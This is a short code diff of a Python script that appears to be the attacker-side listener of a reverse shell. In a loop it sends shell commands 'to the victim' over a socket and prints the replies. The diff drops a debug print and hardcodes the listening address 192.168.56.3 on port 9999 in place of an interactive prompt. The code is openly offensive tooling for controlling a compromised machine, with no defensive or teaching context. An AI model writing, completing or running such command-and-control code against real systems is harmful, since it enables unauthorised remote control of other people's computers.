@@ -76,7 +76,6 @@ def send_commands(conn):
                 """In case of other shell commands, sent them to the victim and take the  answer
                 """
                 nr_bytes = conn.send(str.encode(cmd))
-                print(nr_bytes)
                 victim_response = conn.recv(4096)
                 print(victim_response.decode("utf-8"))
             elif cmd == '':
@@ -118,8 +117,8 @@ def main():
     global host
     global port
     try:
-        host = input("Enter your local host IP > ")
-        print("Set LHOST: %s" % host)
+        host = "192.168.56.3"
+        #print("Set LHOST: %s" % host)
         port = 9999
         create_socket()
     except Exception as e:
